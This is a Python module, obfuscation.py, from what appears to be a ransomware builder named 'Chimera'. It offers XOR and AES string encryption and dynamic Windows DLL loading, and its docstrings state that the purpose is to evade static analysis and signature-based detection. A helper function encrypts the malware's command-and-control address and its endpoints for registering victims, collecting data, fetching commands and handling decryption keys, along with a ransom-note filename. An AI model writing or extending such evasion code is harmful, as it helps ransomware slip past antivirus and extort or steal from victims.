#~/Desktop/Chimera/PayloadBuilder/modules/obfuscation.py
"""
Obfuscation utilities for evading static analysis
"""
import base64
import os
import ctypes
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class Obfuscator:
    """
    Provides string obfuscation and dynamic API loading
    to evade signature-based detection.
    """
    
    @staticmethod
    def xor_encrypt(data: str, key: int = 0xAA) -> str:
        """XOR encrypt a string with a single byte key"""
        encrypted = bytes([ord(c) ^ key for c in data])
        return base64.b64encode(encrypted).decode('utf-8')
    
    @staticmethod
    def xor_decrypt(encrypted_b64: str, key: int = 0xAA) -> str:
        """XOR decrypt a base64-encoded string"""
        encrypted = base64.b64decode(encrypted_b64)
        decrypted = bytes([b ^ key for b in encrypted])
        return decrypted.decode('utf-8')
    
    @staticmethod
    def aes_encrypt(data: str, key: bytes = None) -> tuple:
        """AES encrypt a string with a random key and IV"""
        if key is None:
            key = os.urandom(32)
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return (base64.b64encode(key).decode('utf-8'),
                base64.b64encode(iv).decode('utf-8'),
                base64.b64encode(encrypted).decode('utf-8'))
    
    @staticmethod
    def aes_decrypt(key_b64: str, iv_b64: str, data_b64: str) -> str:
        """AES decrypt a string"""
        key = base64.b64decode(key_b64)
        iv = base64.b64decode(iv_b64)
        encrypted = base64.b64decode(data_b64)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode('utf-8')
    
    @staticmethod
    def dynamic_load_library(dll_name: str):
        """
        Dynamically load a Windows DLL at runtime.
        This avoids static import detection.
        """
        return ctypes.WinDLL(dll_name)
    
    @staticmethod
    def dynamic_resolve_function(dll, func_name: str):
        """
        Resolve a function pointer from a dynamically loaded DLL.
        """
        try:
            return getattr(dll, func_name)
        except AttributeError:
            return None


# Pre-obfuscate critical strings (run once to generate encrypted versions)
def generate_obfuscated_strings():
    """Generate obfuscated versions of sensitive strings"""
    strings_to_obfuscate = [
        "http://10.0.2.20:8080",
        "/api/register",
        "/api/collect",
        "/api/get_command",
        "/api/command_result",
        "/api/decryption_keys",
        "Windows11",
        "chimera.log",
        "ransom_note.jpg"
    ]
    
    print("=== OBFUSCATED STRINGS (XOR with key 0xAA) ===")
    for s in strings_to_obfuscate:
        encrypted = Obfuscator.xor_encrypt(s)
        print(f'"{s}" -> "{encrypted}"')
    
    print("\n=== OBFUSCATED STRINGS (AES) ===")
    for s in strings_to_obfuscate:
        key, iv, data = Obfuscator.aes_encrypt(s)
        print(f'"{s}" -> (key="{key}", iv="{iv}", data="{data}")')


if __name__ == "__main__":
    generate_obfuscated_strings()
